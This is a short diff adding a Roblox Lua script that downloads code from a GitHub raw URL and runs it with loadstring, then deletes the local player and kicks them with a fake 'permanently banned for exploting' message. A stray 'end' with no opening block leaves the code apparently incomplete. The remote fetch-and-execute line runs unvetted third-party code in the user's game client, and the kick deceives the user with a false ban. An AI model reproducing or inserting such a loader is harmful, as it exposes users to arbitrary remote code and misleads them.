@@ -1,0 +1,6 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader")()
+wait(1)
+game.Players.LocalPlayer:Destroy()
+wait(5)
+game.Players.LocalPlayer:Kick("You got permanently banned for exploting")
+end
